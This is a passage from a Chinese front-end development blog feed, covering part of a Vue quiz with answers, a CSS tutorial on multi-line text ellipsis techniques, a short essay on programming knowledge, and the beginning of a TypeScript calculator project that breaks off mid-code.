class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">component-one</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">component-two</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">component-three</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">component-three</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">component-two</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">component-one</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">&#x27;component-one&#x27;</span>, &#123;</span><br><span class="line">  template: `</span><br><span class="line">    &lt;<span class="keyword">div</span>&gt;&lt;slot&gt;&lt;<span class="regexp">/slot&gt;&lt;/</span><span class="keyword">div</span>&gt;</span><br><span class="line">  `,</span><br><span class="line">  provide:&#123;</span><br><span class="line">    provide1()&#123;</span><br><span class="line">      console.log(<span class="string">&#x27;这是component-one提供的函数&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">Vue.component(<span class="string">&#x27;component-two&#x27;</span>, &#123;</span><br><span class="line">  template: `</span><br><span class="line">    &lt;<span class="keyword">div</span>&gt;&lt;slot&gt;&lt;<span class="regexp">/slot&gt;&lt;/</span><span class="keyword">div</span>&gt;</span><br><span class="line">  `,</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">Vue.component(<span class="string">&#x27;component-three&#x27;</span>, &#123;</span><br><span class="line">  template: `</span><br><span class="line">    &lt;button @click=<span class="string">&quot;provide1&quot;</span>&gt;Click me&lt;/button&gt;</span><br><span class="line">  `,</span><br><span class="line">  <span class="keyword">inject</span>: [<span class="string">&#x27;provide1&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>A: 点击 component-three 里的 Click me 按钮，将产生报错，因为这个组件没有这个 method<br>B: 点击 component-three 里的 Click me 按钮，将不会报错，因为这个组件通过依赖注入（provide&#x2F;inject）得到了 provide1 方法</p><h3 id="四十五、"><a href="#四十五、" class="headerlink" title="四十五、"></a>四十五、</h3><h5 id="关于事件-API，正确的有"><a href="#关于事件-API，正确的有" class="headerlink" title="关于事件 API，正确的有"></a>关于事件 API，正确的有</h5><p>A: 我们可以通过 <code>$on(eventName, eventHandler)</code> 侦听一个事件<br>B: 我们可以通过 <code>$once(eventName, eventHandler)</code> 一次性侦听一个事件<br>C: 我们可以通过 <code>$off(eventName, eventHandler)</code> 停止侦听一个事件<br>D: 我们可以通过 <code>$trigger(eventName,eventData)</code> 触发一个事件</p><blockquote><p><em><strong>41.ABCEF 42.keep-alive 43.ABC 44.B 45.ABC</strong></em></p></blockquote><blockquote><p>有疑惑的小胖友，欢迎在底下留言哦~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>纯css实现多行文本省略号</title>
      <link href="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/"/>
      <url>/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/</url>
      
        <content type="html"><![CDATA[<p>看似十分简单的标题截断效果，但是竟然没有一个统一 CSS 属性实现标准，需要用到一些奇淫妙计来实现，一般来说，在做这样文字截断效果时我们更多是希望：</p><ul><li>兼容性好，对各大主流浏览器有好的支持</li><li>响应式截断，根据不同宽度做出调整</li><li>文本超出范围才显示省略号，否则不显示省略号</li><li>省略号位置显示刚好</li></ul><h4 id="单行文本截断-text-overflow"><a href="#单行文本截断-text-overflow" class="headerlink" title="单行文本截断 text-overflow"></a><em>单行文本截断 text-overflow</em></h4><p>文本溢出我们经常用到的应该就是 <code>text-overflow: ellipsis</code> 了，相信大家也很熟悉，只需轻松几行代码就可以实现单行文本截断。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/img.webp"></p><p>属性浏览器原生支持，各大浏览器兼容性好，缺点就是只支持单行文本截断，并不支持多行文本截取。</p><p>适用场景：单行文字截断最简单实现，效果最好，放心使用。</p><p>如果是多行文字截取效果，实现起来就没有那么轻松。</p><h4 id="webkit-line-clamp-实现"><a href="#webkit-line-clamp-实现" class="headerlink" title="-webkit-line-clamp 实现"></a><em>-webkit-line-clamp 实现</em></h4><p>先介绍第一种方式，就是通过 <code>-webkit-line-clamp</code> 属性实现。具体的方式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;  </span><br><span class="line">  -webkit-line-clamp: <span class="number">2</span>;</span><br><span class="line">  -webkit-box-orient: vertical;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它需要和 <code>display</code>、 <code>-webkit-box-orient</code> 和 <code>overflow</code> 结合使用：</p><ul><li><code>display:-webkit-box;</code> 必须结合的属性，将对象作为弹性伸缩盒子模型显示。</li><li><code>-webkit-box-orient;</code> 必须结合的属性，设置或检索伸缩盒对象的子元素的排列方式。</li><li><code>text-overflow:ellipsis;</code> 可选属性，可以用来多行文本的情况下，用省略号“…”隐藏超出范围的文本。</li></ul><p>实现效果：</p><p><img src="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/img_1.webp"></p><p>从效果上来看，它的优点有：</p><p>响应式截断，根据不同宽度做出调整。<br>文本超出范围才显示省略号，否则不显示省略号。<br>浏览器原生实现，所以省略号位置显示刚好。<br>但是缺点也是很直接，因为 <code>-webkit-line-clamp</code> 是一个不规范的属性，它没有出现在 CSS 规范草案中。也就是说只有 <code>webkit</code> 内核的浏览器才支持这个属性，像 Firefox, IE 浏览器统统都不支持这个属性，浏览器兼容性不好。</p><p>使用场景：多用于移动端页面，因为移动设备浏览器更多是基于 <code>webkit</code> 内核，除了兼容性不好，实现截断的效果不错。</p><h4 id="float-特性实现多行文本截断"><a href="#float-特性实现多行文本截断" class="headerlink" title="float 特性实现多行文本截断"></a><em>float 特性实现多行文本截断</em></h4><p>基本原理：</p><p><img src="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/img.png"></p><p>有个三个盒子 div，粉色盒子左浮动，浅蓝色盒子和黄色盒子右浮动：</p><ul><li>当浅蓝色盒子的高度低于粉色盒子，黄色盒子仍会处于浅蓝色盒子右下方。</li><li>如果浅蓝色盒子文本过多，高度超过了粉色盒子，则黄色盒子不会停留在右下方，而是掉到了粉色盒子下。</li></ul><p>好了，这样两种状态的两种展示形式已经区分开了，那么我们可以将黄色盒子进行相对定位，将内容溢出的黄色盒子移动到文本内容右下角，而未溢出的则会被移到外太空去了，只要我们使用 overflow:hidden就可以隐藏掉。</p><p><img src="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/img_1.png"></p><p>基本原理就是这样，我们可以将浅蓝色区域想象成标题，黄色区域想象为省略号效果。那么你可能会觉得粉色盒子占了空间，那岂不是标题会整体延后了吗，这里可以通过 <code>margin</code> 的负值来出来，设置浅蓝色盒子的 <code>margin-left</code> 的负值与粉色盒子的宽度相同，标题也能正常显示。</p><p>那么我们将前面的 DOM 结构简化下，变成下面这样：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span><br><span class="line">  &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">&quot;text&quot;</span>&gt;</span><br><span class="line">    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Dignissimos labore sit vel itaque delectus atquequos magnam assumenda quod architecto perspiciatis animi.</span><br><span class="line">  &lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>刚才的粉色盒子和黄色盒子都可以用伪元素来代替。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.wrap</span> <span class="selector-class">.text</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">word-break</span>:break-all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.wrap</span>:: before &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.wrap</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;...&quot;</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line"><span class="comment">/* 为三个省略号的宽度 */</span></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">3em</span>;</span><br><span class="line"><span class="comment">/* 使盒子不占位置 */</span></span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">3em</span>;</span><br><span class="line"><span class="comment">/* 移动省略号位置 */</span></span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/Blog/2018/11/05/essay/%E7%BA%AFcss%E5%AE%9E%E7%8E%B0%E5%A4%9A%E8%A1%8C%E6%96%87%E6%9C%AC%E7%9C%81%E7%95%A5%E5%8F%B7/index/img_2.webp"></p><p>这里我目前看到最巧妙的方式了。只需要支持 CSS 2.1 的特性就可以了，它的优点有：</p><ul><li>兼容性好，对各大主流浏览器有好的支持。</li><li>响应式截断，根据不同宽度做出调整。</li><li>文本超出范围才显示省略号，否则不显示省略号。</li></ul><p>至于缺点，因为我们是模拟省略号，所以显示位置有时候没办法刚刚好，所以可以考虑：</p><p>加一个渐变效果，贴合文字，就像上述 demo 效果一样。<br>添加 <code>word-break:break-all;</code> 使一个单词能够在换行时进行拆分，这样文字和省略号贴合效果更佳。<br>这个方法应该是我看到最好的用纯 CSS 处理的方式了，如果你有更好的方法，欢迎留言交流！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>对年轻程序员的告诫</title>
      <link href="/Blog/2018/10/26/daisy/%E5%AF%B9%E5%B9%B4%E8%BD%BB%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%91%8A%E8%AF%AB/index/"/>
      <url>/Blog/2018/10/26/daisy/%E5%AF%B9%E5%B9%B4%E8%BD%BB%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%91%8A%E8%AF%AB/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在软件开发中，技术变化如此之快，你花费了大量时间学习技术和工具，一旦这些技术被取代，你的知识将变得毫无价值，因为它们大部分都是实施的细节</p></blockquote><p>我最近总是在想这段话，软件开发算不算是真正的知识？</p><p>如果它是一种真正的知识，那么理论上，我们学到的东西大部分应该不会过时，就好像微积分不会过时一样。可是实际上，我们都知道，软件开发技能有时效性，十年前学习的编程知识，十年后几乎肯定不能用于生产。那样的话，软件开发就不能算真正的知识，只是一种实施的细节。</p><p>公司旁边有一家税务所，每天都有很多人排队交税。如果你是第一次来交税，肯定搞不清楚怎么交，交税是一门学问，必须有人教你，要带哪些证件，要填哪些表，去哪些窗口排队等等。</p><p><strong>我现在认为，学习编程跟学习交税是一样的，都是学习实施的细节。一旦外部环境变了，原来的实施细节就没用了。</strong>当代编程由于层层的抽象和封装，我们已经不必接触底层真正具有通用性的知识了。大部分时候，所谓编程就是在写某个抽象层的配置。比如，网页样式就是在写 CSS 配置，你很难说这到底是真正的知识，还是像《办税指南》那样的实施细节。</p><p>实施细节并不是知识，而是操作步骤。如果技术栈发生变更，实施细节就会毫无用处。但是，你又不能不学习它，不知道实施细节，就没法做出项目。我觉得，程序员应该要警惕，不要落入实施细节的陷阱，不要把全部精力花在实施细节上面，然后以为自己学到了真正的知识。对待各种语言和工具，正确的态度应该是“进得去，出得来”，既要了解足够的细节，也要能够站在宏观的角度看待它，探寻底层到底是怎么实现的。</p><p><img src="/Blog/2018/10/26/daisy/%E5%AF%B9%E5%B9%B4%E8%BD%BB%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%91%8A%E8%AF%AB/index/img.png" alt="电影院（或者大型会议、讲座）很快就会是上图的场景"></p>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一个TS小项目--计算器</title>
      <link href="/Blog/2018/10/24/typescript/%E7%AC%AC%E4%B8%80%E4%B8%AATS%E5%B0%8F%E9%A1%B9%E7%9B%AE--%E8%AE%A1%E7%AE%97%E5%99%A8/index/"/>
      <url>/Blog/2018/10/24/typescript/%E7%AC%AC%E4%B8%80%E4%B8%AATS%E5%B0%8F%E9%A1%B9%E7%9B%AE--%E8%AE%A1%E7%AE%97%E5%99%A8/index/</url>
      
        <content type="html"><![CDATA[<p>看过<code>typescript</code>官网的5分钟上手之后，觉得语法上像极了JS，相比JS，TS更注重于 ‘<code>type</code>‘ （这样一看JS真的是垃圾，很垃圾），于是动动手写了一个计算器<a href="http://js.jirengu.com/bunos/3/edit">(jsbin在线)</a>体验了一下。</p><h5 id="github"><a href="#github" class="headerlink" title="github"></a><a href="https://github.com/Melonxx/firstTS-calculate">github</a></h5><p><a href="https://melonxx.github.io/firstTS-calculate/index.html">预览</a></p><h4 id="typescript："><a href="#typescript：" class="headerlink" title="typescript："></a>typescript：</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Calculate</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> n1: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> n2: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> option: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> result: string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> keys: Array&lt;Array&lt;string&gt;&gt; = [</span><br><span class="line">      [<span class="string">&#x27;Clear&#x27;</span>, <span class="string">&#x27;÷&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;×&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;-&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;+&#x27;</span>],</span><br><span class="line">      [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">public</span> bottomBar: HTMLDivElement;</span><br><span class="line">    <span class="keyword">public</span> top: HTMLDivElement;</span><br><span class="line">    <span class="keyword">public</span> wrap: HTMLDivElement;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">      <span class="keyword">this</span>.createTopScreen();</span><br><span class="line">      <span class="keyword">this</span>.createBottomBar();</span><br><span class="line">      <span class="keyword">this</span>.createWrap();</span><br><span class="line">      <span class="keyword">this</span>.createAllButton();</span><br><span class="line">      <span class="keyword">this</span>.bindEvents();</span><br><span class="line">    &#125;</span><br><span class="line">    createSingleButton(text: string, wrap: HTMLElement, className: string): HTMLButtonElement &#123;</span><br><span class="line">      let button: HTMLButtonElement = document.createElement(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">      button.textContent = text;</span><br><span class="line">      button.classList.add(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">      button.classList.add(className?className:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">      wrap.appendChild(button);</span><br><span class="line">      <span class="keyword">return</span> button;</span><br><span class="line">    &#125;</span><br><span class="line">    createTopScreen(): void &#123;</span><br><span class="line">      let top:HTMLDivElement = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      top.classList.add(<span class="string">&#x27;top-screen&#x27;</span>);</span><br><span class="line">      top.textContent = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">      <span class="keyword">this</span>.top = top;</span><br><span class="line">    &#125;</span><br><span class="line">    createBottomBar(): void &#123;</span><br><span class="line">      let bottom:HTMLDivElement = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      bottom.classList.add(<span class="string">&#x27;bottom-bar&#x27;</span>);</span><br><span class="line">      <span class="keyword">this</span>.bottomBar = bottom;</span><br><span class="line">    &#125;</span><br><span class="line">    createWrap(): void &#123;</span><br><span class="line">      let wrap:HTMLDivElement = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">      document.body.appendChild(wrap);</span><br><span class="line">      wrap.classList.add(<span class="string">&#x27;calc-wrap&#x27;</span>);</span><br><span class="line">      wrap.appendChild(<span class="keyword">this</span>.top);</span><br><span class="line">      wrap.appendChild(<span class="keyword">this</span>.bottomBar);</span><br><span class="line">      <span class="keyword">this</span>.wrap = wrap;</span><br><span class="line">    &#125;</span><br><span class="line">    createAllButton(): void &#123;</span><br><span class="line">      <span class="keyword">this</span>.keys.map((v1:Array&lt;string&gt;): void =&gt; &#123;</span><br><span class="line">        let div:HTMLDivElement = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        div.classList.add(<span class="string">&#x27;button-bar&#x27;</span>);</span><br><span class="line">        v1.map((v2: string): void =&gt; &#123;</span><br><span class="line">          <span class="keyword">this</span>.createSingleButton(v2, div, `button-$&#123;v2&#125;`);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">this</span>.bottomBar.appendChild(div);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    checkNumber(num: string, text: string): void&#123;</span><br><span class="line">      <span class="keyword">if</span>(text === <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="keyword">this</span>[num].indexOf(<span class="string">&#x27;.&#x27;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>[num];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">this</span>[num] += text;</span><br><span class="line">      <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>[num];</span><br><span class="line">    &#125;</span><br><span class="line">    updateNumber(text: string): void &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.option)&#123;</span><br><span class="line">        <span class="keyword">this</span>.checkNumber(<span class="string">&#x27;n2&#x27;</span>, text);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.checkNumber(<span class="string">&#x27;n1&#x27;</span>, text);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    updateOption(text: string):void &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.n1 === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.n1 = <span class="keyword">this</span>.result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">this</span>.option = text;</span><br><span class="line">    &#125;</span><br><span class="line">    updateResult(): void &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.n1 === <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">this</span>.n2 === <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">this</span>.option === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      let result: number;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.option === <span class="string">&#x27;+&#x27;</span>) result = Number(<span class="keyword">this</span>.n1) + Number(<span class="keyword">this</span>.n2);</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.option === <span class="string">&#x27;-&#x27;</span>) result = Number(<span class="keyword">this</span>.n1) - Number(<span class="keyword">this</span>.n2);</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.option === <span class="string">&#x27;×&#x27;</span>) result = Number(<span class="keyword">this</span>.n1) * Number(<span class="keyword">this</span>.n2);</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.option === <span class="string">&#x27;÷&#x27;</span>) result = Number(<span class="keyword">this</span>.n1) / Number(<span class="keyword">this</span>.n2);</span><br><span class="line">      <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = result.toString();</span><br><span class="line">      <span class="keyword">if</span>(result.toString().length &gt; <span class="number">9</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.top.textContent = <span class="keyword">this</span>.result = result.toPrecision(<span class="number">9</span>).toString().replace(/<span class="number">0</span>+$/,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.n2 === <span class="string">&#x27;0&#x27;</span>) <span class="keyword">this</span>.top.textContent = <span class="string">&#x27;不是数字&#x27;</span>;</span><br><span class="line">      <span class="keyword">this</span>.n1 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">this</span>.n2 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      <span class="keyword">this</span>.option = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    updateNumberAndOption(text: string): void&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="string">&#x27;0123456789.&#x27;</span>.indexOf(text) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateNumber(text);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;+-×÷&#x27;</span>.indexOf(text) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateOption(text)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;=&#x27;</span>.indexOf(text) &gt;= <span 